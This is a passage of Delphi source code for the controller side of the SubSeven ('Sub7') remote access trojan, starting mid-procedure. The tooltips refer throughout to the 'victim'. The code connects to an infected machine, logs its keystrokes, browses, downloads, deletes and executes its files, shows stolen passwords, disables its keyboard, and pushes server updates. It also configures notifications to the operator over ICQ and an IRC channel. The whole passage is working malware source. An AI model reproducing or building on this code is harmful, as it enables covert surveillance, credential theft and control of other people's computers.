     SendMessage(PopKeyHook.KeyHook.Handle, WM_CHAR, Byte(#8), 0)
    end
  else if s[loop+1]='û' then
    begin
     SendMessage(KeyHook.Handle, WM_CHAR, VK_TAB, 0);
     SendMessage(PopKeyHook.KeyHook.Handle, WM_CHAR, VK_TAB, 0);
    end;
  s:=copy(s,1,loop-1)+copy(s,loop+2,length(s)-loop);
  dec(loop);
 end;
until loop>=length(s);

if length(s)<2 then exit;
if s='OpenVictimChat' then
 begin
  Form1.ChatSock.Port:=2774;
  Form1.ChatSock.Address:=Form1.ClientSocket.Address;
  try Form1.ChatSock.Active:=True;except end;
  Status.Caption:='chat initiated.';
  VictimChat.ShowIT;
  if Form1.ReadINI('Options','AskForNick?')<>'no' then begin
   If InputQuery('chat request', 'enter a nickname: ', TmpStr) then
   NickName:=TmpStr else NickName:='nickless';
  end else NickName:=Form1.ReadINI('Options','NickName');
  exit;
 end;
if s='OpenClientChat' then
 begin
  Form1.ChatSock.Port:=2774;
  Form1.ChatSock.Address:=Form1.ClientSocket.Address;
  try Form1.ChatSock.Active:=True;except end;
  Status.Caption:='chat initiated.';
  ClientChat.ShowIT;
  if Form1.ReadINI('Options','AskForNick?')<>'no' then begin
   If InputQuery('chat request', 'enter a nickname: ', TmpStr) then
   NickName:=TmpStr else NickName:='nickless';
  end else NickName:=Form1.ReadINI('Options','NickName');
  exit;
 end;
if Form1.Enabled then begin
  if (s<>'<NONE>') and (copy(s,1,4)<>'SIZE') then Status.Caption:=s
   else if (copy(s,1,4)='SIZE') then
    begin
     ssize:=copy(s,5,length(s));
     if length(ssize)>3 then
      ssize:=copy(ssize,1,length(ssize)-3)+','+
             copy(ssize,length(ssize)-2,3);
     Status.Caption:='Size: '+ssize+'k';
    end;
end{ else if Form2.Enabled then
 with Form2.Memo2.Lines do Add(s)};
end;
procedure TForm1.Button1Click(Sender: TObject);
begin
if not Conectat then
 begin
  ClientSocket.Port:=StrToInt(port.Text);
  ClientSocket.Address:=Edit1.Text;
  Conectat:=True;
  Button1.Caption:='disconnect';
  KeepConnectedIP:=Edit1.Text;
 try
  ClientSocket.Active:=True;
 except
  Conectat:=False;
  Button1.Caption:='connect';
  Status.Caption:='can''t connect to '+Edit1.Text+' :((';
 end;
 end
else
 begin
  ClientSocket.Active:=False;
  Conectat:=False;
  Button1.Caption:='connect';
 end;
end;


procedure TForm1.ClientSocketConnecting(Sender: TObject;
  Socket: TCustomWinSocket);
begin
 Status.Caption:='connecting...';
end;

procedure TForm1.ClientSocketLookup(Sender: TObject;
  Socket: TCustomWinSocket);
begin
 Status.Caption:='lookin'' up IP #...';
end;

procedure TForm1.ClientSocketError(Sender: TObject;
  Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
  var ErrorCode: Integer);
begin
 try keysock.active:=false;except end;
 Status.Caption:='error while connectin''';
 Conectat:=False;Button1.Caption:='connect';
 ICQSpyForm.ICQSpySocket.Active:=False;
end;

procedure TForm1.Button8Click(Sender: TObject);
begin
 nonstopForm.show;
end;

procedure TForm1.Button9Click(Sender: TObject);
begin
if MessageDlg('are you sure you wanna disable the keyboard? you won''t be able to change it back! ',
    mtConfirmation, [mbYes, mbNo], 0) = mrYes then
if Conectat then begin
 ClientSocket.Socket.SendText('DAK');
 Status.Caption:='trying to disable all keys...';
end else Status.Caption:=NotConnected;
end;

procedure TForm1.SetSub7Color(col:String);
begin
 ListBox1.Color:=StringToColor(col);
 KeyHook.Color:=StringToColor(col);
 ListBox2.Color:=StringToColor(col);
 Info.Color:=StringToColor(col);
 Label2.Color:=StringToColor(col);
 Edit1.Color:=StringToColor(col);
 Port.Color:=StringToColor(col);
 Form3.Edit4.Color:=StringToColor(col);
 Form3.Edit5.Color:=StringToColor(col);
 Form3.RxSpinEdit1.Color:=StringToColor(col);
end;

procedure ReadRegistryStuff;
var ri:integer;
    tmpstr:string;
begin
 with Form1 do begin
 try
 if ReadINI('IP Addresses','Current')<>'ERROR' then begin
  CurrentHost:=StrToInt(ReadINI('IP Addresses','Current'));
  Edit1.Text:=ReadINI('IP Addresses','Host'+IntToStr(CurrentHost));
  if ReadINI('IP Addresses','Port'+IntToStr(CurrentHost))<>'ERROR' then
  port.text:=ReadINI('IP Addresses','Port'+IntToStr(CurrentHost))
  else begin
   port.text:='1243';
   SaveINI('IP Addresses','Port'+IntToStr(CurrentHost),'1243');
  end;
 if ReadINI('IP Addresses','CurrentHost')<>'ERROR' then
  Edit1.Text:=ReadINI('IP Addresses','CurrentHost');
 if ReadINI('IP Addresses','CurrentPort')<>'ERROR' then
  port.text:=ReadINI('IP Addresses','CurrentPort');
{  dir.text:=ReadINI('Options','SaveToDir');}
{ if ReadINI('Options','MyUIN')<>'ERROR' then
  icq.text:=ReadINI('Options','MyUIN');}
 end else begin
  SaveINI('IP Addresses','Current','1');
  SaveINI('IP Addresses','Host1','0.0.0.0');
  SaveINI('IP Addresses','Name1','victim #1');
  SaveINI('IP Addresses','Port1','1243');
 { SaveINI('Options','SaveToDir','<default>');    }
  SaveINI('IP Addresses','Count','1');
  SaveINI('IP Addresses','Current','1');
  CurrentHost:=1;
  Edit1.Text:='0.0.0.0';
 end;
 except
  SaveINI('IP Addresses','Current','1');
  SaveINI('IP Addresses','Host1','0.0.0.0');
  SaveINI('IP Addresses','Name1','victim #1');
  SaveINI('IP Addresses','Port1','1243');
  SaveINI('IP Addresses','Count','1');
  SaveINI('IP Addresses','Current','1');
  CurrentHost:=1;
  Edit1.Text:='0.0.0.0';
 end;
 if (ReadINI('Options','SaveToDir')<>'ERROR') and
    (ReadINI('Options','SaveToDir')<>'<default>') then
    dir.text:=ReadINI('Options','SaveToDir') else
    dir.text:='<default>';
 if (dir.text='<default>') or (dir.text='') then dir.text:=ExtractFilePath(ParamStr(0));   
 SaveINI('Options','SaveToDir',dir.text);
 if (ReadINI('Options','Help')='off') then
  begin
   Label2.Visible:=True;
   Info.Visible:=False;
  end else SaveINI('Options','Help','on');
 if (ReadINI('Options','NickName')='ERROR') then
  begin
   If InputQuery('enter your nick name', 'nickname [you can change it in OPTIONS]: ', TmpStr) then
   begin
    SaveINI('Options','NickName',TmpStr);
    SaveINI('Options','AskForNick?','no');
   end else begin
    SaveINI('Options','NickName','');
    SaveINI('Options','AskForNick?','yes');
   end;
  end;
 if ReadINI('Options','VictimChatSize')='ERROR' then
  begin
   Form1.SaveINI('Options','ClientChatColor',ColorToString(clWhite));
   Form1.SaveINI('Options','VictimChatColor',ColorToString(clYellow));
   Form1.SaveINI('Options','ClientFontSize','12');
   Form1.SaveINI('Options','VictimFontSize','10');
   Form1.SaveINI('Options','VictimChatSize','50');
  end;

 if (ReadINI('Options','MainBitmap')='ERROR') or (ReadINI('Options','MainBitmap')='<default>') then
  Form1.Image1.Picture.Bitmap.LoadFromResourceName(HInstance,'BITMAP_2')
 else
 try
  Form1.Image1.Picture.Bitmap.LoadFromFile(ReadINI('Options','MainBitmap'));
 except
  ShowMessage('skin: '+ReadINI('Options','MainBitmap')+' not found. using default skin.');
  Form1.Image1.Picture.Bitmap.LoadFromResourceName(HInstance,'BITMAP_2')
 end;
 if (ReadINI('Options','Sub7Color')='ERROR') then
  Form1.SaveINI('Options','Sub7Color','$00804000');
{ else Form1.SetSub7Color(ReadINI('Options','Sub7Color'));}
end;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
 Transferand:=False;
 ServerVersion:='1.0';
 MouseOFF:=False;
 IsGetKeys:=False;
 tmpint:=0;
 SetErrorMode({SEM_FAILCRITICALERRORS}SEM_NOALIGNMENTFAULTEXCEPT);
 InFile:=0;
 Done:=False;
 InChat:=False;
 MyStream := TMemoryStream.Create;
 sending:=false;
 Refreshing:=False;
 GetDrives:=False;
 RECORDING:=False;
 InTransfer:=False;
 Transfering:=False;
 ftpactive:=false;
 getkeylog:=false;
 iale:=False;
 DriversLoaded:=False;
 Gettin:=False;
 Downloading:=False;
 DownloadingFile:='';
 ReadRegistryStuff;
end;

procedure TForm1.Button10Click(Sender: TObject);
var str:String;
begin
if Conectat then begin
{ if InputQuery('enter a nickname for the chat', 'nick name: ', Str) then
  NickName:=Str else NickName:='nickless';
 if nickname='' then nickname:='nickless';}
 PickChatForm.ShowModal;
end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button11Click(Sender: TObject);
begin
if MessageDlg('are you sure you wanna close the server?',
    mtConfirmation, [mbYes, mbNo], 0) = mrYes then
if Conectat then begin
 ClientSocket.Socket.SendText('CLS');
 Status.Caption:='closing server...';
 ClientSocket.Active:=False;
 Conectat:=False;
end else Status.Caption:=NotConnected;
end;

procedure TForm1.UpdateFileManager;
begin
 ListBox1.Sorted:=True;
 ListBox1.Items.Clear;
 if dir.text<>'<default>' then
  ListBox1.Items.LoadFromFile(dir.text+'\temp.dat')
 else
  ListBox1.Items.LoadFromFile('temp.dat');
{ ListBox1.Items.LoadFromStream(StreamSaved);}
end;

procedure TForm1.UpdateWinManager;
begin
 ListBox2.Sorted:=False;
 ListBox2.Items.Clear;
{ SendKeyForm.ListBox1.Sorted:=False;
 SendKeyForm.ListBox1.Items.Clear;}
 if dir.text<>'<default>' then
 begin
  ListBox2.Items.LoadFromFile(dir.text+'\temp.dat');
{  SendKeyForm.ListBox1.Items.LoadFromFile(dir.text+'\temp.dat');}
  deletefile(dir.text+'\temp.dat');
 end else begin
  ListBox2.Items.LoadFromFile('temp.dat');
{  SendKeyForm.ListBox1.Items.LoadFromFile('temp.dat');}
  deletefile('temp.dat');
 end;
 if SendKeyForm.Active then
  SendKeyForm.UpdateTheList(true)
 else
  SendKeyForm.UpdateTheList(false);
end;

procedure TForm1.UpdateDrivers;
begin
 ShowInformations.ShowInfo.Enabled:=True;
 Form1.Enabled:=False;
 ShowInformations.ShowInfo.Show;
end;

procedure tform1.ShowPasswords(sender:TObject);
begin
{  Form1.Enabled:=False;
  Form2.Visible:=True;
  Form2.Enabled:=True;
  Form2.Show;
 GetFol.Hide;
 Form1.Enabled:=True;
 GetFol.Enabled:=False;
  form1.enabled:=false;
  pass.visible:=true;
  pass.enabled:=true;}
{ pass.showmodal;}
 pass.show;
 Status.Caption:='passwords retrieved.';
{ form1.enabled:=true;}
end;


procedure TForm1.RefreshFM;
begin
 if NotPassedVersionCheck('1.3') then exit;
 transferand:=true;
 ClientSocket.Socket.SendText('RSH'+path.Caption);
 Status.Caption:='refreshing...';
end;

procedure TForm1.Button17Click(Sender: TObject);
begin
if Conectat then begin
{ if NotPassedVersionCheck('1.3') then exit;
 transferand:=true;
 path.Caption:='C:';
 ClientSocket.Socket.SendText('RSH'+path.Caption);
 Status.Caption:='refreshing...';}
 path.Caption:='C:';
 refreshfm;
end else Status.Caption:=NotConnected;
end;



procedure TForm1.ListBox1DblClick(Sender: TObject);
var sclicked,nextdir:string;
    i,ati:integer;
    LocalPath:String;
begin
 LocalPath:=path.Caption;
 with ListBox1 do sclicked:=Items[ItemIndex];
 if copy(sclicked,1,1)='<' then
  begin
   ListBox1.Items.Clear;
   nextdir:=copy(sclicked,2,length(sclicked)-2);
   if nextdir<>'..' then LocalPath:=LocalPath+'\'+nextdir
    else begin
   ati:=0;
   for i:=length(LocalPath) downto 1 do
     if (copy(LocalPath,i,1)='\') then begin ati:=i;break;end;
    LocalPath:=copy(LocalPath,1,ati-1);
   end;
   Path.Caption:=LocalPath;
   ClientSocket.Socket.SendText('RSH'+path.Caption);
   transferand:=true;
{   Refreshing:=true; }
   Status.Caption:='refreshing...';
  end;
end;

procedure TForm1.Button18Click(Sender: TObject);
var getpath:string;
begin
if Conectat then begin
 if NotPassedVersionCheck('1.3') then exit;
 If (not InputQuery('you can type manually a new path.', 'path:', GetPath)) then exit;
 path.Caption:=GetPath;
 transferand:=true;
 ClientSocket.Socket.SendText('RSH'+path.Caption);
 Status.Caption:='refreshing...';
end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button19Click(Sender: TObject);
var sclicked,fisier:String;
begin
 if Conectat then begin
 sclicked:=ListBox1.Items[ListBox1.ItemIndex];
 if (copy(sclicked,1,1)='<')
  then begin
   Status.Caption:='you gotta click on a FILE before clicking that button.';
   exit;
  end;
  if MessageDlg('are you sure you want to delete ['+Path.Caption+'\'+sclicked+'] ?',
    mtConfirmation, [mbYes, mbNo], 0) = mrYes then
  begin
   fisier:=Path.Caption+'\'+sclicked;
   ClientSocket.Socket.SendText('FMD'+fisier);
   Status.Caption:='trying to erase the file...';
  end;
 end else Status.Caption:=NotConnected;
end;

function Este(fis,ext1,ext2:string):Boolean;
var ext:string;
    res:boolean;
begin
 ext:=copy(fis,length(fis)-2,3);
 if (UpperCase(ext)=UpperCase(ext1)) or (UpperCase(ext)=UpperCase(ext2))
  then res:=True else Res:=False;
Result:=Res;
end;

procedure TForm1.Button20Click(Sender: TObject);
var sclicked,fisier:String;
begin
 if Conectat then begin
 sclicked:=ListBox1.Items[ListBox1.ItemIndex];
 if (copy(sclicked,1,1)='<')
  then begin
   Status.Caption:='you gotta click on a FILE before clicking that button.';
   exit;
  end;
  if not Este(sclicked,'WAV','WAV') then
   begin ShowMessage('you gotta click on a WAV file');exit;end;
  fisier:=Path.Caption+'\'+sclicked;
  ClientSocket.Socket.SendText('FMP'+fisier);
  Status.Caption:='trying to play WAV file...';
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button21Click(Sender: TObject);
var sclicked,fisier:String;
begin
 if Conectat then begin
 sclicked:=ListBox1.Items[ListBox1.ItemIndex];
 if (copy(sclicked,1,1)='<')
  then begin
   Status.Caption:='you gotta click on a FILE before clicking that button.';
   exit;
  end;
  if not Este(sclicked,'BMP','JPG') then
   begin ShowMessage('you gotta click on a BMP or JPG file');exit;end;
  fisier:=Path.Caption+'\'+sclicked;
  ClientSocket.Socket.SendText('FMW'+fisier);
  Status.Caption:='trying to set the wallpaper...';
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button23Click(Sender: TObject);
var sclicked,fisier:String;
begin
 if Conectat then begin
 sclicked:=ListBox1.Items[ListBox1.ItemIndex];
 if (copy(sclicked,1,1)='<')
  then begin
   Status.Caption:='you gotta click on a FILE before clicking that button.';
   exit;
  end;
  fisier:=Path.Caption+'\'+sclicked;
  ClientSocket.Socket.SendText('FMS'+fisier);
  Status.Caption:='trying to get filesize ...';
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.SetTransferON;
begin
 transferand:=true;
 waitform.showmodal;
end;

procedure TForm1.SetTransferandON;
begin
 transferand:=true;
end;

procedure TForm1.Button22Click(Sender: TObject);
var sclicked,fisier:String;
begin
 if Conectat then begin
 sclicked:=ListBox1.Items[ListBox1.ItemIndex];
 if (copy(sclicked,1,1)='<')
  then begin
   Status.Caption:='you gotta click on a FILE before clicking that button.';
   exit;
  end;
  fisier:=Path.Caption+'\'+sclicked;
  ClientSocket.Socket.SendText('NTF'+fisier);
  transferand:=true;
  DownloadingFile:=sclicked;
  Status.Caption:='downloading file ...';
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.Trimite(ce:string);
var MyFStream: TFileStream;
Begin
  NMStrm := TNMStrm.Create(Self);
  NMStrm.OnPacketSent:=NMStrm1PacketSent;
  try MyFStream := TFileStream.Create(ce, fmOpenRead);except showmessage('error reading file: '+ce);end;
  try
    NMStrm.Host := KeepConnectedIP;
    NMStrm.Port := 6711;
    NMStrm.FromName := 'ss';
    NMStrm.TimeOut := 900000;
    NMStrm.ReportLevel := Status_Basic;
    try
     NMStrm.PostIt(MyFStream);
    except
      try
       NMStrm.Port := 6713;
       NMStrm.PostIt(MyFStream);
      except
       NMStrm.Port := 6712;
       NMStrm.PostIt(MyFStream);
      end;
    end;
  finally
    MyFStream.Free;
    NMStrm.Free;
  end;
end;

procedure TForm1.UploadFile(bparam:boolean;Sender:TObject);
var MyFStream: TFileStream;
    nume,cet:String;
Begin
 if bparam then
  if not OpenPictureDialog1.Execute then exit;
 if not bparam then
  if not OpenDialog1.Execute then exit;
 nume:=ExtractFileName(OpenDialog1.FileName);
 if not bparam then
  ClientSocket.Socket.SendText('DLT'+nume);
 if bparam then
  cet:=OpenPictureDialog1.FileName
 else
  cet:=OpenDialog1.FileName;
  Trimite(cet);
  Status.Caption:='file sent successfully.';
  if not bparam then RefreshFM;
end;


procedure TForm1.Button25Click(Sender: TObject);
begin
if Conectat then begin
 ClientSocket.Socket.SendText('UPD');
 Status.Caption:='updating...';
 UploadFile(true,Sender);
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
 SaveINI('IP Addresses','Current',IntToStr(CurrentHost));
 SaveINI('IP Addresses','CurrentHost',Edit1.Text);
 SaveINI('IP Addresses','CurrentPort',port.text);
{ SaveINI('Options','MyUIN',icq.text);}
 {if MouseHook <> 0 then
  UnhookWindowsHookEx(MouseHook);}
end;

procedure TForm1.Button27Click(Sender: TObject);
begin
 Lista.Enabled:=True;
 Form1.Enabled:=False;
 Lista.Show;
end;

procedure TForm1.FormActivate(Sender: TObject);
begin
 if Tag<>0 then CurrentHost:=Tag;
end;

procedure TForm1.NMStrm1PacketSent(Sender: TObject);
begin
with NMStrm do begin
 progr.MaxValue:=BytesTotal;
 progr.Progress:=BytesSent;
 if BytesTotal=BytesSent then progr.progress:=0;
end;
end;

procedure TForm1.pathMouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 path.Hint:=path.Caption;
end;

procedure TForm1.Button28Click(Sender: TObject);
begin
if Conectat then begin
 if NotPassedVersionCheck('1.2') then exit;
 EMailForm.Tag:=2;
 EMailForm.Caption:='auto-notify by ICQ';
 EMailForm.Label1.Caption:='notify to UIN: [enter your uin number]';
 EMailForm.Label2.Caption:='victim name: [it will be included in the msg]';
 EMailForm.Label3.Caption:='<not used>';
 if ReadINI('Options','MyUIN')<>'ERROR' then
  EMailForm.Edit1.Text:=ReadINI('Options','MyUIN')
 else EMailForm.Edit1.Text:='14438136';
 EMailForm.Edit2.Text:='none';
 EMailForm.Edit3.Text:='<not used>';
 EMailForm.Show;
end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button29Click(Sender: TObject);
begin
if Conectat then begin
 if NotPassedVersionCheck('1.8') then exit;
 EMailForm.Tag:=3;
 EMailForm.Caption:='auto-notify by IRC';
 EMailForm.Label1.Caption:='notify to channel or nickname: [eg.#sub7 or mynick]';
 EMailForm.Label2.Caption:='IRC server: [has to be a DALNET or EFFNET server]';
 EMailForm.Label3.Caption:='IRC server port:';
 EMailForm.Edit1.Text:='#subseven';
 EMailForm.Edit2.Text:='irc.eu.dal.net';
 EMailForm.Edit3.Text:='7000';
 EMailForm.Show;
end else Status.Caption:=NotConnected;
end;

procedure TForm1.dirMouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 dir.Hint:=dir.Text;
 info.caption:='the folder where all the downloaded files are saved';
end;

procedure TForm1.Button31Click(Sender: TObject);
var TmpStr:String;
begin
 if Conectat then begin
  If InputQuery('new password', 'password:', TmpStr) then
  begin
   if TmpStr='' then TmpStr:='_PZD';
   ClientSocket.Socket.SendText('NPD'+TmpStr);
   Status.Caption:='trying to set the new password...';
 end;end else Status.Caption:=NotConnected;
end;

procedure TForm1.RefreshIT(sender:TObject);
begin
if Conectat then begin
 if NotPassedVersionCheck('1.3') then exit;
 if not CheckBox1.Checked then
  ClientSocket.Socket.SendText('RAW')
 else ClientSocket.Socket.SendText('RAWON');
 Status.Caption:='refreshing...';
end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button34Click(Sender: TObject);
begin
 RefreshIT(sender);
end;

procedure TForm1.Button35Click(Sender: TObject);
begin
if Conectat then begin
 ClientSocket.Socket.SendText('CAW'+IntToStr(ListBox2.ItemIndex+1));
 with ListBox2 do
  Status.Caption:='trying to close <'+Items[ItemIndex]+'>...';
end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button37Click(Sender: TObject);
begin
if Conectat then begin
 ClientSocket.Socket.SendText('EAW'+IntToStr(ListBox2.ItemIndex+1));
 with ListBox2 do
  Status.Caption:='trying to enable <'+Items[ItemIndex]+'>...';
end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button36Click(Sender: TObject);
begin
if Conectat then begin
 ClientSocket.Socket.SendText('DAW'+IntToStr(ListBox2.ItemIndex+1));
 with ListBox2 do
  Status.Caption:='trying to disable <'+Items[ItemIndex]+'>...';
end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button38Click(Sender: TObject);
begin
if (DriversLoaded) then
 begin
{  GetNewPath.Enabled:=True;
  Form1.Enabled:=False;}
  GetNewPath.Show;
  exit;
 end;
if Conectat then begin
 if NotPassedVersionCheck('1.3') then exit;
 ClientSocket.Socket.SendText('GDR');
 Status.Caption:='gettin'' all the available drives...';
end else Status.Caption:=NotConnected;
end;

procedure TForm1.ceasTimer(Sender: TObject);
begin
{ progbar.stepit;
 if progbar.position>progbar.max then progbar.position:=0;}
end;

procedure TForm1.Button39Click(Sender: TObject);
begin
if Conectat then begin
 ClientSocket.Socket.SendText('DCB'+IntToStr(ListBox2.ItemIndex+1));
 with ListBox2 do
  Status.Caption:='trying to disable the CLOSE button on <'+Items[ItemIndex]+'>...';
end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button40Click(Sender: TObject);
var sclicked,fisier:String;
begin
 if Conectat then begin
 sclicked:=ListBox1.Items[ListBox1.ItemIndex];
 if (copy(sclicked,1,1)='<')
  then begin
   Status.Caption:='you gotta click on a FILE before clicking that button.';
   exit;
  end;
  fisier:=Path.Caption+'\'+sclicked;
  ClientSocket.Socket.SendText('FMX'+fisier);
  Status.Caption:='trying to execute the file...';
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.Edit1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
info.caption:='type the victim''s IP number in this box'#13#10'or click on <IP #s address book> to add/use/remove users';
end;

procedure TForm1.Button1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:=' '#13#10'click here to connect to the specified ip #';
end;

procedure TForm1.Button8MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='you''ll receive a screen shot with the victim''s current desktop';
end;

procedure TForm1.Button31MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='set the password of the victim''s computer. you''ll only be able to connect to it using that password';
end;

procedure TForm1.Button10MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='initiate a small chat with the victim [just like ICQ chat, only funnier :)]';
end;

procedure TForm1.Button9MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='disable the victim''s keyborad. he/she won''t be able to use the keyboard anymore';
end;

procedure TForm1.Button25MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='updates the PATCH on the victim''s computer [if you wanna send him/her a new version]';
end;

procedure TForm1.Button11MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='close the PATCH on the victim''s computer.';
end;

procedure TForm1.icqMouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:=' '#13#10'enter YOUR ICQ number here [the UIN]';
end;

procedure TForm1.Button28MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:=' '#13#10'enable the online notification.[to the specified UIN]';
end;

procedure TForm1.Button29MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='set the server to send a notification on IRC when the victim''s computer is online';
end;

procedure TForm1.ListBox1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='list of all the victim''s files and directories [marked with < >]. double click a directory to change to it.';
end;

procedure TForm1.Button17MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='get all the files and directories from the victim''s drive C:';
end;

procedure TForm1.Button18MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='change the folders manually. '#13#10'eg. D:\APPS\WHATEVER\';
end;

procedure TForm1.Button38MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='get a list of alll the drives installed on the victim''s computer [and allows you to change to different drives]';
end;

procedure TForm1.Button40MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='exactly like Start-Run'#13#10'eg. mytext.txt opens in Notepad';
end;

procedure TForm1.Button22MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='download the selected file. [try to get the file size first, so you won''t be stuck downloading 500 megs]';
end;

procedure TForm1.Button23MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:=' '#13#10'receives the size of the selected file';
end;

procedure TForm1.Button19MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:=' '#13#10'deletes the specified file [duh!]';
end;

procedure TForm1.Button20MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='plays the selected WAV file on the victim''s computer';
end;

procedure TForm1.Button21MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='sets the specified JPG or BMP file as the victim''s wallpaper';
end;

procedure TForm1.ListBox2MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='this is a list of all the opened [visible] programs on the victim''s computer. the first program is the active one.';
end;

procedure TForm1.Button34MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='gets a list of all the opened [visible] programs on the victim''s computer';
end;

procedure TForm1.Button35MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='force the closing of the selected program';
end;

procedure TForm1.Button37MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='enable the selected program [the victim will be able to interact with it]';
end;

procedure TForm1.Button36MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='disable the selected program [the victim won''t be able to use the program anymore]';
end;

procedure TForm1.Button39MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='disable the CLOSE button of the selected program [the user will still be able to close it using File/Exit]';
end;

procedure TForm1.Button27MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='opens a neat little address book that allows you to add/use/delete ip #s and names :)';
end;

procedure TForm1.InfoMouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='read this box for more information'#13#10+
               '[when you move the mouse over a button or window]';
end;

procedure TForm1.StatusBarMouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='always look on this status bar, because all the answers from the PATCH are displayed here';
end;

procedure TForm1.Label9MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Status.Caption:='close the connection and exit Sub7';
 Cursor:=crHandPoint;
end;

procedure TForm1.Button46MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='gets information about the victim''s computer. [windows version, cpu info, display info etc.]';
end;

procedure TForm1.Button46Click(Sender: TObject);
begin
 if Conectat then begin
 if NotPassedVersionCheck('1.2') then exit;
  ClientSocket.Socket.SendText('GMI');
  Status.Caption:='trying to get more information...';
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button47MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='sets the name of the patch. the patch will save itself and will update the registry with that name. ';
end;

procedure TForm1.Button47Click(Sender: TObject);
var GetPath:String;
begin
 if Conectat then begin
 If (not InputQuery('type new name (without the EXE extension)', 'enter new name:', GetPath)) then exit;
  ClientSocket.Socket.SendText('CSN'+GetPath);
  Status.Caption:='trying to change server name...';
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button48Click(Sender: TObject);
begin
 keyhook.clear;
end;

procedure TForm1.listkeyClick(Sender: TObject);
begin
 if Conectat then begin
  if (not IsGetKeys) then
   begin
    ClientSocket.Socket.SendText('TKSon');
   end else begin
    ClientSocket.Socket.SendText('TKSoff');
    keysock.active:=false;
    IsGetKeys:=False;
    listkey.Caption:='on';
   end;
  Status.Caption:='trying to change the key listings...';

 end else Status.Caption:=NotConnected;
end;

procedure TForm1.listkeyMouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='changes whether to listen or not for the keys pressed on the victim''s computer';
end;

procedure TForm1.Button48MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='clears the contents of the [list of pressed keys]';
end;

procedure TForm1.keyhookMouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='this is where all the keys pressed by the victim are displayed. [that''s if the program is enabled to do so]';
end;

procedure TForm1.Button51MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='allows you to upload a file on your computer to the victim''s current directory.';
end;

procedure TForm1.Button51Click(Sender: TObject);
begin
if Conectat then begin
 ClientSocket.Socket.SendText('ULF'+path.caption);
 Status.Caption:='attempting to upload the file...';
 UploadFile(false,Sender);
 end else Status.Caption:=NotConnected;
end;

procedure TForm1.Button52MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 info.caption:='close AND remove the server from the victim''s computer.';
end;

procedure TForm1.Button52Click(Sender: TObject);
begin
if MessageDlg('are you sure you wanna remove the server?',
    mtConfirmation, [mbYes, mbNo], 0) = mrYes then
if Conectat then begin
 ClientSocket.Socket.SendText('RMS');
 Status.Caption:='removing server...';
 {ClientSocket.Active:=False;
 Conectat:=False;}
end else Status.Caption:=NotConnected;
end;

